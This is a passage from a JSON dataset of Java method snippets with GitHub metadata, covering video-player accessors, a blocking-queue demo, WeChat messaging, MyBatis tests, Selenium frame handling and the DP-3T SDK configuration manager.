"modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isTouchWigetFull() {\n        return mIsTouchWigetFull;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55295, "method_name": "setNeedShowWifiTip", "class_name": "GSYVideoControlView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNeedShowWifiTip(boolean needShowWifiTip) {\n        this.mNeedShowWifiTip = needShowWifiTip;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55296, "method_name": "setSeekRatio", "class_name": "GSYVideoControlView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSeekRatio(float seekRatio) {\n        if (seekRatio < 0) {\n            return;\n        }\n        this.mSeekRatio = seekRatio;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55297, "method_name": "getSeekRatio", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getSeekRatio() {\n        return mSeekRatio;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55298, "method_name": "isNeedLockFull", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isNeedLockFull() {\n        return mNeedLockFull;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55299, "method_name": "setNeedLockFull", "class_name": "GSYVideoControlView", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNeedLockFull(boolean needLoadFull) {\n        this.mNeedLockFull = needLoadFull;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55300, "method_name": "setLockClickListener", "class_name": "GSYVideoControlView", "params": ["LockClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLockClickListener(LockClickListener lockClickListener) {\n        this.mLockClickListener = lockClickListener;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55301, "method_name": "setDismissControlTime", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDismissControlTime(int dismissControlTime) {\n        this.mDismissControlTime = dismissControlTime;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55302, "method_name": "getDismissControlTime", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDismissControlTime() {\n        return mDismissControlTime;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55303, "method_name": "setGSYVideoProgressListener", "class_name": "GSYVideoControlView", "params": ["GSYVideoProgressListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGSYVideoProgressListener(GSYVideoProgressListener videoProgressListener) {\n        this.mGSYVideoProgressListener = videoProgressListener;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55304, "method_name": "put", "class_name": "BetterYetQueue", "params": ["E"], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void put(E e) throws InterruptedException {\n    lock.lock(); // can be interruptible, or with timeout!\n    try {\n      while (count == 10)\n        notFull.await();\n      data[count++] = e;\n      notEmpty.signal();\n    } finally {\n      lock.unlock();\n    }\n  }", "url": "https://raw.githubusercontent.com/SimonHGR/safari-threads/master/src/main/java/queue/BetterYetQueue.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55305, "method_name": "take", "class_name": "BetterYetQueue", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "E", "snippet": "  public E take() throws InterruptedException {\n    lock.lock();\n    try {\n      while (count == 0) // MIGHT wake up for wrong reasons (OS limitation)\n        notEmpty.await();\n      E rv = data[0];\n      System.arraycopy(data, 1, data, 0, --count);\n      notFull.signal();\n      return rv;\n    } finally {\n      lock.unlock();\n    }\n  }", "url": "https://raw.githubusercontent.com/SimonHGR/safari-threads/master/src/main/java/queue/BetterYetQueue.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55306, "method_name": "main", "class_name": "BetterYetQueue", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void main(String[] args) {\n    BetterYetQueue<int[]> queue = new BetterYetQueue<>();\n    new Thread(()-> {\n      System.out.println(\"Producer starting...\");\n      for (int i = 0; i < 10_000; i++) {\n        int [] data = {i, 0};\n        try {\n          if (i < 100) {\n            Thread.sleep(1);\n          }\n          data[1] = i;\n          if (i == 5_000) {\n            data[0] = -99;\n          }\n          queue.put(data); data = null; // SIMON SAYS!!!\n        } catch (InterruptedException e) {\n          e.printStackTrace();\n        }\n      }\n      System.out.println(\"Producer ending...\");\n    }).start();\n    new Thread(()-> {\n      System.out.println(\"Consumer starting...\");\n      for (int i = 0; i < 10_000; i++) {\n        try {\n          int [] data = queue.take();\n          if (data[0] != i || data[1] != i) {\n            System.out.println(\"**** ERROR at index \" + i);\n          }\n          if (i > 9_900) {\n            Thread.sleep(1);\n          }\n        } catch (InterruptedException ie) {\n          ie.printStackTrace();\n        }\n      }\n      System.out.println(\"Consumer ending...\");\n    }).start();\n  }", "url": "https://raw.githubusercontent.com/SimonHGR/safari-threads/master/src/main/java/queue/BetterYetQueue.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55307, "method_name": "sendMsg", "class_name": "MpMsgService", "params": ["String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void sendMsg(String msg) {\n\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/mp/handler/MpMsgService.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55308, "method_name": "sendTemplateMsg1", "class_name": "MpMsgService", "params": ["String", "String", "String", "String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendTemplateMsg1(String openId, String deviceName, String deviceInfo, String msgType, String createTime, String remark) {\n        WxMpTemplateMessage tsMessage = WxMpTemplateMessage.builder()\n                .toUser(openId)\n                .templateId(\"HjUvN0HogQAPVfvN9b-Yyq_rC6SbxzTM7f7Eq9p746s\")\n                .build();\n\n        // \u6d4b\u8bd5\u8d26\u53f7\n        if (StringUtils.isBlank(wxMpService.getWxMpConfigStorage().getAesKey())) {\n            tsMessage.setTemplateId(securityProperties.getWx().getTemplateId());\n        }\n\n        tsMessage.addData(new WxMpTemplateData(\"keyword1\", deviceName));\n        tsMessage.addData(new WxMpTemplateData(\"keyword2\", deviceInfo));\n        tsMessage.addData(new WxMpTemplateData(\"keyword3\", msgType));\n        tsMessage.addData(new WxMpTemplateData(\"keyword4\", createTime));\n        tsMessage.addData(new WxMpTemplateData(\"remark\", remark));\n        try {\n            wxMpService.getTemplateMsgService().sendTemplateMsg(tsMessage);\n        } catch (WxErrorException e) {\n            log.error(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/mp/handler/MpMsgService.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55309, "method_name": "sendTextMsg", "class_name": "MpMsgService", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendTextMsg(String openId, String deviceName, String msg) {\n        WxMpKefuMessage build = WxMpKefuMessage\n                .TEXT()\n                .toUser(openId)\n                .content(deviceName + \": \" + msg)\n                .build();\n\n        if (StringUtils.isBlank(deviceName)) {\n            build.setContent(msg);\n        }\n        try {\n\n            wxMpService.getKefuService().sendKefuMessage(build);\n        } catch (WxErrorException e) {\n            log.error(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/mp/handler/MpMsgService.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55310, "method_name": "sendImgMsg", "class_name": "MpMsgService", "params": ["String", "String", "byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendImgMsg(String openId, String deviceName, byte[] img) {\n        File file = null;\n        try {\n            // \u4e0a\u4f20\n            file = new File(IdUtil.fastSimpleUUID());\n            FileUtil.writeBytes(img, file);\n            WxMediaUploadResult wxMediaUploadResult = wxMpService\n                    .getMaterialService()\n                    .mediaUpload(WxConsts.KefuMsgType.IMAGE, file);\n\n            // \u53d1\u9001\u7ed9\u7528\u6237\n            WxMpKefuMessage build = WxMpKefuMessage\n                    .IMAGE()\n                    .toUser(openId)\n                    .mediaId(wxMediaUploadResult.getMediaId())\n                    .build();\n            wxMpService.getKefuService().sendKefuMessage(build);\n        } catch (WxErrorException e) {\n            e.printStackTrace();\n            file.deleteOnExit();\n            log.error(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/mp/handler/MpMsgService.java", "stars": "6", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55311, "method_name": "setup", "class_name": "AutoMappingUnknownColumnBehaviorTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "    static void setup() throws Exception {\n        DataSource dataSource = BaseDataTest.createBlogDataSource();\n        TransactionFactory transactionFactory = new JdbcTransactionFactory();\n        Environment environment = new Environment(\"Production\", transactionFactory, dataSource);\n        Configuration configuration = new Configuration(environment);\n        configuration.addMapper(Mapper.class);\n        sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55312, "method_name": "none", "class_name": "AutoMappingUnknownColumnBehaviorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void none() {\n        sqlSessionFactory.getConfiguration().setAutoMappingUnknownColumnBehavior(AutoMappingUnknownColumnBehavior.NONE);\n        try (SqlSession session = sqlSessionFactory.openSession()) {\n            Mapper mapper = session.getMapper(Mapper.class);\n            Author author = mapper.selectAuthor(101);\n            assertThat(author.getId()).isEqualTo(101);\n            assertThat(author.getUsername()).isNull();\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55313, "method_name": "warningCauseByUnknownPropertyType", "class_name": "AutoMappingUnknownColumnBehaviorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void warningCauseByUnknownPropertyType() {\n        sqlSessionFactory.getConfiguration().setAutoMappingUnknownColumnBehavior(AutoMappingUnknownColumnBehavior.WARNING);\n        try (SqlSession session = sqlSessionFactory.openSession()) {\n            Mapper mapper = session.getMapper(Mapper.class);\n            SimpleAuthor author = mapper.selectSimpleAuthor(101);\n            assertThat(author.getId()).isNull();\n            assertThat(author.getUsername()).isEqualTo(\"jim\");\n            assertThat(LastEventSavedAppender.event.getMessage().toString()).isEqualTo(\"Unknown column is detected on 'org.apache.ibatis.session.AutoMappingUnknownColumnBehaviorTest$Mapper.selectSimpleAuthor' auto-mapping. Mapping parameters are [columnName=ID,propertyName=id,propertyType=java.util.concurrent.atomic.AtomicInteger]\");\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55314, "method_name": "failingCauseByUnknownColumn", "class_name": "AutoMappingUnknownColumnBehaviorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void failingCauseByUnknownColumn() {\n        sqlSessionFactory.getConfiguration().setAutoMappingUnknownColumnBehavior(AutoMappingUnknownColumnBehavior.FAILING);\n        try (SqlSession session = sqlSessionFactory.openSession()) {\n            Mapper mapper = session.getMapper(Mapper.class);\n            mapper.selectAuthor(101);\n        } catch (PersistenceException e) {\n            assertThat(e.getCause()).isInstanceOf(SqlSessionException.class);\n            assertThat(e.getCause().getMessage()).isEqualTo(\"Unknown column is detected on 'org.apache.ibatis.session.AutoMappingUnknownColumnBehaviorTest$Mapper.selectAuthor' auto-mapping. Mapping parameters are [columnName=USERNAMEEEE,propertyName=USERNAMEEEE,propertyType=null]\");\n        }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55315, "method_name": "getId", "class_name": "SimpleAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AtomicInteger", "snippet": "        public AtomicInteger getId() {\n            return id;\n        }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 55316, "method_name": "setId", "class_name": "SimpleAuthor", "params": ["AtomicInteger"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setId(AtomicInteger id) {\n            this.id = id;\n        }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 55317, "method_name": "getUsername", "class_name": "SimpleAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getUsername() {\n            return username;\n        }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 55318, "method_name": "setUsername", "class_name": "SimpleAuthor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setUsername(String username) {\n            this.username = username;\n        }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 55319, "method_name": "doAppend", "class_name": "LastEventSavedAppender", "params": ["LoggingEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void doAppend(LoggingEvent event) {\n            LastEventSavedAppender.event = event;\n        }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/session/AutoMappingUnknownColumnBehaviorTest.java", "stars": "15", "class_props": {"extends": "NullAppender", "implements": null, "modifiers": ["public", "static"]}}, {"id": 55320, "method_name": "main", "class_name": "FrameHandling", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException {\n\t\t\n\t\t\n\t\tSystem.setProperty(ChromeDriverService.CHROME_DRIVER_SILENT_OUTPUT_PROPERTY, \"true\");\n\n\t\t// System.setProperty(\"webdriver.chrome.silentOutput\", \"true\");\n\n\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"drivers/chromedriver.exe\");\n\t\tWebDriver driver = new ChromeDriver();\n\t\tString url = \"http://jiravm.centralus.cloudapp.azure.com:8081/index.html\";\n\t\tdriver.get(url);\n\t\t\n\t\tdriver.findElement(By.linkText(\"Others\")).click();\n\t\t\n\t\tdriver.findElement(By.linkText(\"Iframe\")).click();\n\t\t\n\t\tThread.sleep(15000);\n\t\tdriver.switchTo().frame(\"FrameOne\");\n\t\t\n\t\tdriver.findElement(By.linkText(\"Home\")).click();\n\t\t\n\t\tdriver.switchTo().defaultContent();\n\t\t\n\t\tThread.sleep(15000);\n\t\t\n\t\tWebElement frameTwo=driver.findElement(By.xpath(\"//iframe[@name='FrameTwo']\"));\n\t\tdriver.switchTo().frame(frameTwo);\n\t\t\n\t\tWebElement logo=driver.findElement(By.xpath(\"//a[@class='custom-logo-link']\"));\n\t\t\n\t\tboolean isLogoDisplayed=logo.isDisplayed();\n\t\t\n\t\tif(isLogoDisplayed) {\n\t\t\tSystem.out.println(\"Test PASS\");\n\t\t}else {\n\t\t\tSystem.out.println(\"Test FAIL\");\n\t\t}\n\t\t\n\t\tThread.sleep(3000);\n\t\tdriver.quit();\n\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class5/FrameHandling.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55321, "method_name": "furnaceFuelBurnTimeEvent", "class_name": "JungleFuel", "params": ["FurnaceFuelBurnTimeEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void furnaceFuelBurnTimeEvent(FurnaceFuelBurnTimeEvent event) {\n\t\tif (event.getItemStack().getItem() == new ItemStack(JungleTanbarkBlock.block, (int) (1)).getItem())\n\t\t\tevent.setBurnTime(1600);\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/fuel/JungleFuel.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 55322, "method_name": "encode", "class_name": "PackageEncoder", "params": ["ChannelHandlerContext", "ProtocolBody", "ByteBuf"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void encode(ChannelHandlerContext ctx, ProtocolBody protocolBody, ByteBuf out) throws Exception {\n        encoder.encode(ctx, protocolBody, out);\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/tcp/codec/PackageEncoder.java", "stars": "6", "class_props": {"extends": "MessageToByteEncoder", "implements": null, "modifiers": ["public"]}}, {"id": 55323, "method_name": "logPointCut", "class_name": "WebLogAspect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void logPointCut() {\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/common/aspect/WebLogAspect.java", "stars": "137", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55324, "method_name": "doBefore", "class_name": "WebLogAspect", "params": ["JoinPoint"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void doBefore(JoinPoint joinPoint) throws Throwable {\n        // \u63a5\u6536\u5230\u8bf7\u6c42\uff0c\u8bb0\u5f55\u8bf7\u6c42\u5185\u5bb9\n        ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();\n        HttpServletRequest request = attributes.getRequest();\n\n        // \u8bb0\u5f55\u4e0b\u8bf7\u6c42\u5185\u5bb9\n        logger.info(\"\u8bf7\u6c42\u5730\u5740 : \" + request.getRequestURL().toString());\n        logger.info(\"HTTP METHOD : \" + request.getMethod());\n        // \u83b7\u53d6\u771f\u5b9e\u7684ip\u5730\u5740\n        //logger.info(\"IP : \" + IPAddressUtil.getClientIpAddress(request));\n        logger.info(\"CLASS_METHOD : \" + joinPoint.getSignature().getDeclaringTypeName() + \".\"\n                + joinPoint.getSignature().getName());\n        logger.info(\"\u53c2\u6570 : \" + Arrays.toString(joinPoint.getArgs()));\n//        loggger.info(\"\u53c2\u6570 : \" + joinPoint.getArgs());\n\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/common/aspect/WebLogAspect.java", "stars": "137", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55325, "method_name": "doAfterReturning", "class_name": "WebLogAspect", "params": ["Object"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void doAfterReturning(Object ret) throws Throwable {\n        // \u5904\u7406\u5b8c\u8bf7\u6c42\uff0c\u8fd4\u56de\u5185\u5bb9(\u8fd4\u56de\u503c\u592a\u590d\u6742\u65f6\uff0c\u6253\u5370\u7684\u662f\u7269\u7406\u5b58\u50a8\u7a7a\u95f4\u7684\u5730\u5740)\n        logger.debug(\"\u8fd4\u56de\u503c : \" + ret);\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/common/aspect/WebLogAspect.java", "stars": "137", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55326, "method_name": "doAround", "class_name": "WebLogAspect", "params": ["ProceedingJoinPoint"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object doAround(ProceedingJoinPoint pjp) throws Throwable {\n        long startTime = System.currentTimeMillis();\n        Object ob = pjp.proceed();// ob \u4e3a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\n        logger.info(\"\u8017\u65f6 : \" + (System.currentTimeMillis() - startTime));\n        return ob;\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-admin/src/main/java/com/java2nb/common/aspect/WebLogAspect.java", "stars": "137", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55327, "method_name": "getInstance", "class_name": "AppConfigManager", "params": ["Context"], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "AppConfigManager", "snippet": "\tpublic static synchronized AppConfigManager getInstance(Context context) {\n\t\tif (instance == null) {\n\t\t\tinstance = new AppConfigManager(context);\n\t\t}\n\t\treturn instance;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55328, "method_name": "setAppId", "class_name": "AppConfigManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAppId(String appId) {\n\t\tthis.appId = appId;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55329, "method_name": "triggerLoad", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void triggerLoad() {\n\t\tuseDiscovery = true;\n\t\tdiscoveryRepository.getDiscovery(new ResponseCallback<ApplicationsList>() {\n\t\t\t@Override\n\t\t\tpublic void onSuccess(ApplicationsList response) {\n\t\t\t\tsharedPrefs.edit().putString(PREF_APPLICATION_LIST, Json.toJson(response)).apply();\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onError(Throwable throwable) {\n\t\t\t\tthrowable.printStackTrace();\n\t\t\t}\n\t\t}, isDevDiscoveryMode);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55330, "method_name": "setManualApplicationInfo", "class_name": "AppConfigManager", "params": ["ApplicationInfo"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setManualApplicationInfo(ApplicationInfo applicationInfo) {\n\t\tuseDiscovery = false;\n\t\tsetAppId(applicationInfo.getAppId());\n\t\tApplicationsList applicationsList = new ApplicationsList();\n\t\tapplicationsList.getApplications().add(applicationInfo);\n\t\tsharedPrefs.edit().putString(PREF_APPLICATION_LIST, Json.toJson(applicationsList)).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55331, "method_name": "updateFromDiscoverySynchronous", "class_name": "AppConfigManager", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void updateFromDiscoverySynchronous() throws IOException {\n\t\tif (useDiscovery) {\n\t\t\tApplicationsList response = discoveryRepository.getDiscoverySync(isDevDiscoveryMode);\n\t\t\tsharedPrefs.edit().putString(PREF_APPLICATION_LIST, Json.toJson(response)).apply();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55332, "method_name": "getLoadedApplicationsList", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ApplicationsList", "snippet": "\tpublic ApplicationsList getLoadedApplicationsList() {\n\t\treturn Json.safeFromJson(sharedPrefs.getString(PREF_APPLICATION_LIST, \"{}\"), ApplicationsList.class,\n\t\t\t\tApplicationsList::new);\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55333, "method_name": "getAppConfig", "class_name": "AppConfigManager", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "ApplicationInfo", "snippet": "\tpublic ApplicationInfo getAppConfig() throws IllegalStateException {\n\t\tfor (ApplicationInfo application : getLoadedApplicationsList().getApplications()) {\n\t\t\tif (application.getAppId().equals(appId)) {\n\t\t\t\treturn application;\n\t\t\t}\n\t\t}\n\t\tthrow new IllegalStateException(\"The provided appId is not found by the discovery service!\");\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55334, "method_name": "setAdvertisingEnabled", "class_name": "AppConfigManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAdvertisingEnabled(boolean enabled) {\n\t\tsharedPrefs.edit().putBoolean(PREF_ADVERTISING_ENABLED, enabled).apply();\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/internal/AppConfigManager.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55335, "method_name": "isAdvertisingEnabled", "class_name": "AppConfigManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isAdvertisingEnabled() {\n\t\treturn sharedPrefs.getBoolean(PREF_ADVERTISING_ENABLED, false);\n\t}", "url": 